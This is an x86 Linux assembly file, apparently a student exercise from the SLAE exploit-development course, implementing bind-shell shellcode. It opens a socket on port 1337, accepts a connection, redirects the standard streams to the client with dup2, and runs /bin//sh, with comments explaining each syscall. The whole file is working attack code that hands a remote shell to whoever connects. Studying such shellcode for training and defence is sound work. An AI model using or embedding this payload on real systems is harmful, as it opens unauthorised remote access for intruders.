global _start ; Hi linker we are going to use _start as entry point
;Author - Anurag Srivastava
;Student-ID: SLAE-1219
;Credit - Vivek Ramachandran Sir
section .text

_start: ; entry point of program
push byte 0x66 ;Pushing socket sys call no. on stack
pop eax ; EAX=0x66 - socket sys call no. [this will come again and again :p]
xor ebx,ebx ; Clearing out EBX
push ebx    ;Pushing parameters one by one [this one is null being pushed on stack] - [IPPROTO_IP]
inc ebx     ;EBX=1
push ebx    ;The second parameter in little endian(parameter's context) style is being pushed on stack [0x1 on stack] - [SOCK_STREAM]
push byte 0x2 ; Third parameter is pushed on stack [0x2 on stack] - [AF_INET]
; [All three parameters are pushed [2 1 0] on stack ]
mov ecx,esp ;save pointer to socket arguements -> [2 1 0]
cdq     ;Clear out EDX
int 0x80    ;Calling Interrupt for syscall

xchg esi,eax;Saving sockdfd in esi 

push edx          ;Pushing null on stack [EDX is already cleared in the begining using cdq] - [sockaddr.sin_addr.s_addr]
push word 0x3905  ;Pushing port no. 1337 [Configure your Port here ] 
inc ebx           ;[SYS_BIND 0x2]
push bx           ;push 0x2 onto stack
mov ecx,esp       ;save pointer to bind arguements i.e pointer to sockaddr

push 0x10         ;length of address
push ecx          ;pointer to sockaddr
push esi          ;points to sockfd
mov ecx,esp       ;save pointer to socket arguements
push byte 0x66    ;[As i said :p this will come again and again bcoz we are dealing with socket ;)] - [Socket sys call number]
pop eax           ;EAX contain socket sys call number
int 0x80          ;Calling Interrupt for syscall

push ebx        ;Since ebx contain 2 then We can push 2 as backlog on stack ] - [push backlog 2]
push byte 0x4   ;[SYS_LISTEN 0x4]
pop ebx         ;[EBX contain SYS_BIND number]
push esi        ;[push pointer to sockfd]
mov ecx,esp     ;save pointer to socket arguements
push byte 0x66  ;[:p Again ;) Socket sys call number]
pop eax         ;EAX contain socket sys call number 
int 0x80        ;Calling Interrupt for syscall

;[accept(int sockfd, NULL, NULL);]
push edx      ;PUSH null on stack
push edx      ;PUSH null on stack
push esi      ;PUSH pointer to sockfd
mov ecx,esp   ;save pointer to socket arguements
inc ebx       ;[SYS_ACCEPT 5]
push byte 0x66;[Again :p Socket sys call number]
pop eax       ;EAX contain socket sys call number
int 0x80      ;Calling Interrupt for sys call
xchg ebx,eax  ;Saving cleintfd in ebx

push byte 0x2	  ;push 0x2 on stack
pop ecx		; ECX = 2 - [ECX as a counter for loop]

loop:
push byte 0x3f    ;push dup2 sys call number on stack
pop eax           ;EAX contains dup2 sys call number i.e 0x3f
int 0x80	        ;Calling Interrupt for sys call
dec ecx	          ;decrement counter ECX by -1
jns loop          ;Jump if condition is met

xor ecx,ecx         ;Clearing out ecx [ECX=0]
push ecx            ;Pushing null on stack
push byte 0x0b      ;Pushing execve sys call number on stack
pop eax             ;EAX contain execve sys call number
push 0x68732f2f     ; part1 of port string /bin//sh 
push 0x6e69622f     ; part2 of port string /bin//sh
mov ebx,esp         ;Pointer to string null terminated
int 0x80            ;Calling Interrupt for sys call
